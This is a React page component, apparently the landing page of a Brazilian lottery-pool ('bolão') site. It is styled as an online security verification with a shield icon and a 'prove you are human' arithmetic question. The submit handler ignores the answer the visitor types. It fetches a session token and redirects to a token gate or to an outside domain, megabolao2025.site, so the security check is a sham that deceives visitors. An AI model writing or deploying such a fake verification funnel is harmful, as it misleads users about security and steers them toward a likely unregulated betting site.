import { useState } from "react";

export default function Quiz() {
  const [answer, setAnswer] = useState("");
  const [loading, setLoading] = useState(false);
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [cookiesOpen, setCookiesOpen] = useState(true);

  // Helper UTM (sem alteração de lógica)
  const withQuery = (url) => {
    try {
      const srcQs = typeof window !== "undefined" ? window.location.search : "";
      if (!srcQs || srcQs === "?") return url;
      const dest = new URL(
        url,
        typeof window !== "undefined" ? window.location.origin : "https://example.com"
      );
      const incoming = new URLSearchParams(srcQs);
      incoming.forEach((val, key) => {
        if (!dest.searchParams.has(key)) dest.searchParams.set(key, val);
      });
      return dest.pathname + (dest.search ? dest.search : "") + (dest.hash || "");
    } catch {
      return url;
    }
  };

  const handleSubmit = async () => {
    setLoading(true);
    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
    const goDefault = async () => {
      await wait(300);
      window.location.href = withQuery("https://www.megabolao2025.site/");
    };

    try {
      const res = await fetch(withQuery("/api/session-token"), { method: "POST" });
      const data = await res.json().catch(() => null);

      if (res.ok && data?.token) {
        window.location.href = withQuery(`/api/go?token=${encodeURIComponent(data.token)}`);
      } else {
        await goDefault();
      }
    } catch {
      await goDefault();
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page">
      <main className="wrapper">
        <section className="card">
          <h1 className="title">Verificação Online</h1>

          <div className="iconWrap" aria-hidden="true">
            <div className="iconCircle">
              <span className="emojiClover" role="img" aria-label="Escudo de segurança">
                🛡️
              </span>
            </div>
          </div>

          <p className="subtitle">Conclue a verificação para prosseguir</p>

          <button
            className="cta"
            onClick={() => setModalOpen(true)}
            aria-haspopup="dialog"
            aria-controls="modal-root"
          >
            ADQUIRIR COTAS
          </button>

          <nav className="links" aria-label="links-legais">
            <a href="/politica-de-privacidade">Política de Privacidade</a>
            <span className="sep">|</span>
            <a href="/termos-de-uso">Termos de Uso</a>
          </nav>
        </section>
      </main>

      {cookiesOpen && (
        <div className="cookieBar" role="region" aria-label="cookies">
          <span>Usamos cookies para melhorar sua experiência.</span>
          <button type="button" className="cookieBtn" onClick={() => setCookiesOpen(false)}>
            Aceitar
          </button>
        </div>
      )}

      {modalOpen && (
        <div
          id="modal-root"
          className="backdrop"
          role="dialog"
          aria-modal="true"
          aria-labelledby="modal-title"
        >
          <div className="modal popIn">
            {step === 1 && (
              <>
                <h2 id="modal-title" className="modalTitle">
                  Bem-vindo ao portal de atendimento
                </h2>
                <p className="modalText">Para continuar, faremos uma verificação simples.</p>
                <button className="primary microTilt" onClick={() => setStep(2)}>
                  Iniciar verificação
                </button>
                <button
                  className="ghost"
                  onClick={() => {
                    setModalOpen(false);
                    setStep(1);
                    setAnswer("");
                  }}
                >
                  Cancelar
                </button>
              </>
            )}

            {step === 2 && (
              <>
                <h3 className="sectionOver">Prova humana para prosseguir</h3>
                <h2 className="question">Quanto é 1 + 2?</h2>

                <input
                  type="text"
                  value={answer}
                  onChange={(e) => setAnswer(e.target.value)}
                  placeholder="Digite sua resposta"
                  className="input"
                />

                <div className="row">
                  <button className="primary microTilt" onClick={handleSubmit} disabled={loading}>
                    {loading ? "Verificando..." : "Prosseguir"}
                  </button>
                  <button
                    className="ghost"
                    onClick={() => {
                      setStep(1);
                      setAnswer("");
                    }}
                  >
                    Voltar
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* ===== GLOBAL ===== */}
      <style jsx global>{`
        html,
        body,
        #__next {
          height: 100%;
        }
        * {
          box-sizing: border-box;
        }
        body {
          margin: 0;
          background: radial-gradient(1200px 700px at 20% -10%, #e6f7ff 0%, rgba(230, 247, 255, 0) 60%),
            radial-gradient(900px 600px at 90% 0%, #e9f1ff 0%, rgba(233, 241, 255, 0) 55%),
            linear-gradient(180deg, #eef7ff 0%, #eaf2ff 55%, #e9f6ff 100%);
          color: #0b1220;
          font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
        }
        button,
        input,
        a {
          outline: none;
        }
        :focus-visible {
          outline: 3px solid rgba(56, 189, 248, 0.55);
          outline-offset: 2px;
        }
        @media (prefers-reduced-motion: reduce) {
          * {
            animation: none !important;
            transition: none !important;
            scroll-behavior: auto !important;
          }
        }
      `}</style>

      {/* ===== SCOPED ===== */}
      <style jsx>{`
        .page {
          min-height: 100dvh;
          display: grid;
          place-items: center;
          padding: 32px 16px 96px;
          background: radial-gradient(900px 600px at 10% 10%, rgba(56, 189, 248, 0.16), transparent 60%),
            radial-gradient(700px 500px at 90% 20%, rgba(59, 130, 246, 0.16), transparent 55%),
            linear-gradient(180deg, #eff8ff 0%, #eaf2ff 55%, #e9f6ff 100%);
        }
        .wrapper {
          width: 100%;
          display: grid;
          place-items: center;
        }
        .card {
          width: min(720px, 92vw);
          background: rgba(255, 255, 255, 0.78);
          backdrop-filter: blur(10px);
          border-radius: 18px;
          padding: 38px 28px 28px;
          border: 1px solid rgba(2, 132, 199, 0.14);
          box-shadow: 0 14px 40px rgba(2, 8, 23, 0.08);
          text-align: center;
        }
        .title {
          margin: 0 0 8px;
          font-size: clamp(22px, 3.6vw, 28px);
          font-weight: 900;
          color: #0b1220;
          letter-spacing: 0.2px;
        }

        .iconWrap {
          display: grid;
          place-items: center;
          margin: 18px 0 10px;
        }
        .iconCircle {
          width: 112px;
          height: 112px;
          border-radius: 999px;
          display: grid;
          place-items: center;
          background: radial-gradient(60px 60px at 35% 30%, rgba(56, 189, 248, 0.28), rgba(59, 130, 246, 0.12)),
            linear-gradient(180deg, rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.68));
          border: 1px solid rgba(2, 132, 199, 0.22);
          box-shadow: inset 0 1px 10px rgba(2, 132, 199, 0.12), 0 10px 24px rgba(2, 8, 23, 0.10);
        }

        .emojiClover {
          font-size: 54px;
          line-height: 1;
          display: inline-block;
          animation: pulseShield 1.8s ease-in-out infinite;
          text-shadow: 0 6px 18px rgba(2, 8, 23, 0.18);
          filter: saturate(1.05) brightness(1.02);
        }

        @keyframes pulseShield {
          0% {
            transform: translateY(0) scale(1);
          }
          50% {
            transform: translateY(-1px) scale(1.12);
          }
          100% {
            transform: translateY(0) scale(1);
          }
        }

        .subtitle {
          margin: 8px auto 18px;
          max-width: 560px;
          color: rgba(15, 23, 42, 0.78);
          font-size: 15.5px;
          line-height: 1.5;
        }

        .cta {
          appearance: none;
          border: 1px solid rgba(2, 132, 199, 0.55);
          cursor: pointer;
          padding: 12px 22px;
          border-radius: 12px;
          background: linear-gradient(180deg, #0ea5e9 0%, #2563eb 100%);
          color: #ffffff;
          font-weight: 900;
          letter-spacing: 0.35px;
          font-size: 14.5px;
          transition: transform 120ms ease, box-shadow 180ms ease, filter 180ms ease, background-color 180ms ease;
          box-shadow: 0 10px 22px rgba(37, 99, 235, 0.22);
        }
        .cta:hover {
          transform: translateY(-1px);
          filter: brightness(1.03);
          box-shadow: 0 14px 28px rgba(37, 99, 235, 0.26);
        }
        .cta:active {
          transform: translateY(0);
          filter: none;
        }
        .cta:focus-visible {
          box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.25), 0 12px 26px rgba(37, 99, 235, 0.22);
        }

        .links {
          margin-top: 18px;
          font-size: 14px;
        }
        .links a {
          color: #075985;
          text-decoration: underline;
          font-weight: 700;
        }
        .links a:hover {
          opacity: 0.92;
        }
        .sep {
          margin: 0 8px;
          color: rgba(148, 163, 184, 0.9);
        }

        .cookieBar {
          position: fixed;
          left: 50%;
          transform: translateX(-50%);
          bottom: 18px;
          width: min(860px, 92vw);
          background: rgba(255, 255, 255, 0.86);
          backdrop-filter: blur(10px);
          color: #0b1220;
          border-radius: 14px;
          padding: 14px 16px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 12px;
          border: 1px solid rgba(2, 132, 199, 0.16);
          box-shadow: 0 14px 34px rgba(2, 8, 23, 0.12);
        }
        .cookieBtn {
          appearance: none;
          border: 1px solid rgba(2, 132, 199, 0.55);
          cursor: pointer;
          padding: 10px 18px;
          border-radius: 10px;
          background: linear-gradient(180deg, #0ea5e9 0%, #2563eb 100%);
          color: #fff;
          font-weight: 900;
          transition: filter 160ms ease, transform 120ms ease, box-shadow 180ms ease;
          box-shadow: 0 10px 20px rgba(37, 99, 235, 0.20);
        }
        .cookieBtn:hover {
          filter: brightness(1.03);
          transform: translateY(-1px);
        }
        .cookieBtn:active {
          transform: translateY(0);
        }
        .cookieBtn:focus-visible {
          box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.24), 0 10px 22px rgba(37, 99, 235, 0.20);
        }

        .backdrop {
          position: fixed;
          inset: 0;
          display: grid;
          place-items: center;
          background: rgba(2, 8, 23, 0.55);
          backdrop-filter: blur(3px);
          z-index: 50;
        }
        .modal {
          width: min(92vw, 520px);
          background: rgba(255, 255, 255, 0.88);
          backdrop-filter: blur(12px);
          border-radius: 16px;
          padding: 22px;
          color: #0b1220;
          box-shadow: 0 22px 60px rgba(2, 8, 23, 0.25);
          border: 1px solid rgba(2, 132, 199, 0.16);
          text-align: center;
        }
        .popIn {
          animation: popIn 180ms ease-out both;
        }
        @keyframes popIn {
          from {
            opacity: 0;
            transform: scale(0.985);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }

        .modalTitle {
          margin: 4px 0 8px;
          font-size: clamp(20px, 4vw, 26px);
          font-weight: 900;
          color: #0b1220;
        }
        .modalText {
          margin: 0 0 18px;
          color: rgba(15, 23, 42, 0.78);
          line-height: 1.5;
        }
        .sectionOver {
          margin: 2px 0 6px;
          font-size: 12px;
          letter-spacing: 0.6px;
          text-transform: uppercase;
          color: #0369a1;
        }
        .question {
          margin: 0 0 12px;
          font-size: 20px;
          font-weight: 900;
          color: #0b1220;
        }

        .input {
          width: 100%;
          padding: 12px 14px;
          border-radius: 12px;
          border: 1px solid rgba(2, 132, 199, 0.28);
          outline: none;
          margin: 4px 0 16px;
          text-align: center;
          font-size: 16px;
          background: rgba(255, 255, 255, 0.92);
          color: #0b1220;
          transition: box-shadow 160ms ease, transform 120ms ease, border-color 160ms ease, background-color 160ms ease;
        }
        .input::placeholder {
          color: rgba(100, 116, 139, 0.9);
        }
        .input:focus-visible {
          box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.22);
          border-color: rgba(2, 132, 199, 0.55);
          transform: translateY(-1px);
        }

        .row {
          display: flex;
          gap: 10px;
          flex-wrap: wrap;
          justify-content: center;
        }
        .primary {
          flex: 1;
          min-width: 160px;
          appearance: none;
          border: 1px solid rgba(2, 132, 199, 0.55);
          cursor: pointer;
          padding: 12px 18px;
          border-radius: 12px;
          background: linear-gradient(180deg, #0ea5e9 0%, #2563eb 100%);
          color: #ffffff;
          font-weight: 900;
          transition: transform 120ms ease, box-shadow 200ms ease, filter 160ms ease;
          box-shadow: 0 10px 22px rgba(37, 99, 235, 0.22);
        }
        .primary:disabled {
          opacity: 0.7;
          cursor: not-allowed;
        }
        .primary:hover:not(:disabled) {
          transform: translateY(-1px);
          filter: brightness(1.03);
        }
        .primary:active:not(:disabled) {
          transform: translateY(0);
        }
        .primary:focus-visible {
          box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.24), 0 10px 22px rgba(37, 99, 235, 0.22);
        }

        .ghost {
          flex: 0 1 auto;
          min-width: 120px;
          appearance: none;
          border: 1px solid rgba(2, 132, 199, 0.26);
          background: rgba(255, 255, 255, 0.92);
          color: #0b1220;
          cursor: pointer;
          padding: 12px 18px;
          border-radius: 12px;
          transition: background 0.2s ease, transform 0.12s ease, box-shadow 0.18s ease, border-color 0.18s ease;
        }
        .ghost:hover {
          background: rgba(56, 189, 248, 0.08);
          transform: translateY(-1px);
          border-color: rgba(2, 132, 199, 0.34);
        }
        .ghost:active {
          transform: translateY(0);
        }
        .ghost:focus-visible {
          box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.20);
        }
      `}</style>
    </div>
  );
}
